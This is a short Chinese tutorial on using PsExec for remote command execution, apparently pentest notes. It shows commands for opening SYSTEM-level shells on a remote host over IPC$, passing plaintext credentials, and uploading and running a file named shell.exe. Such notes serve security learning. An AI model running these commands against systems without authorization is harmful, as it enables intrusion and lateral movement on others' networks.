# **概述**

实用工具（如 Telnet）和远程控制程序（如 Symantec 的 PC Anywhere）使您可以在远程系统上执行程序，但安装它们非常困难，并且需要您在想要访问的远程系统上安装客户端软件。PsExec 是一个轻型的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性。PsExec 最强大的功能之一是在远程系统和远程支持工具（如 IpConfig）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。

只需将 PsExec 复制到可执行路径。键入“psexec”可显示其使用语法。

PsExec 可在 Windows Vista、NT 4.0、Win2K、Windows XP 和 Server 2003（包括 64 位版本的 Windows）上运行。

  

# **工具相关使用**

**执行文件利用**

工具下载地址：

https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec

在建立IPC$管道连接的情况下使用psexec工具建立连接，可能在第一次执行此工具运行时会弹窗，就可以加上以下参数。

\-accepteula 加上该参数就不会弹窗;

\-s 加此参数返回的将会是一个system权限的命令窗口;

\-u 用户名 -p 返回一个指定用户名和密码的命令窗口;

/c 参数可以执行系统命令。

这里是加了一个-s参数

Psexec \-accepteula \\\\192.168.1.1 -s cmd.exe

![](../Images/60ce5c33dac75d8166420887852831c7.png)

无-s参数的命令行将返回一个系统管理员的权限命令窗口。

Psexec.exe -acctepteula \\\\192.168.1.1 cmd.exe

![](../Images/70c336bebac9bb3dc37eab4d961a91aa.png)

加-u和-p参数返回一个指定的用户名和密码的命令窗口。

Psexec.exe \-accepteula \\\\192.168.1.1 -u pte -p Abc123! Cmd.exe

![](../Images/2eaff9bfdd1d82a0bf72d7f114087d3d.png)

加上/c参数执行系统命令并回显。

Psexec.exe \\\\192.168.1.1 cmd.exe /c “whoami”

Psexec.exe \-u 用户名 -p 密码 \\\\192.168.1.1 cmd.exe /c “whoami”

![](../Images/eb5d4f5cacf7fbf9cced7a9c1aaa2ac1.png)

将已经上传的可执行文件进行执行

Psexec.exe \\\\IP -s C:\\shell.exe

![](../Images/4a1a154cd19112d50f657a81657ecf0d.png)

![](../Images/68ce9fcde855cd57c93697f273d4c6f3.png)

上传文件并执行程序

Psexec.exe \\\\IP \-c shell.exe
